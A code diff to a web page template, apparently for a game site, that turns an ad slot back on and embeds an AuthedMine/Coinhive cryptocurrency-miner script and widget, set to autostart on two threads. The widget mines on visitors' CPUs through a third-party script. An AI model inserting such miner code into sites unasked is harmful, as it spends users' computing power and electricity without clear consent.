@@ -95,12 +95,23 @@ html(lang="en-US")
                 span.team-button ATK
                 span.team-button DEF
 
-            if(false && settings.disableAds == 0)
+            if(settings.disableAds == 0)
+                script(src="https://authedmine.com/lib/simple-ui.min.js" async)
                 #anchor-ad
-                    #desperate-plead.
-                        This is where an ad would appear if it didn't fail to load!<br>
-                        You can completely disable all ads in the settings.
                     #ad-container
+                        #desperate-plead.
+                            This is where an ad would appear if it didn't fail to load!<br>
+                            You can completely disable all ads in the settings.
+                        .coinhive-miner(
+                            style='position:relative;width:360px;height:200px',
+                            data-key='0gNTo0ArFKBSVhViMBIS9ong3LA3ZJAQ'
+                            data-autostart="true"
+                            data-background="#808080"
+                            data-text="#020202"
+                            data-threads="2"
+                            data-throttle="0.5")
+                            em Loading...
+
 
         #dialogue-container(onclick="closeAllDialogues()")
             #settings-window.m-dialogue(style="display:none;")
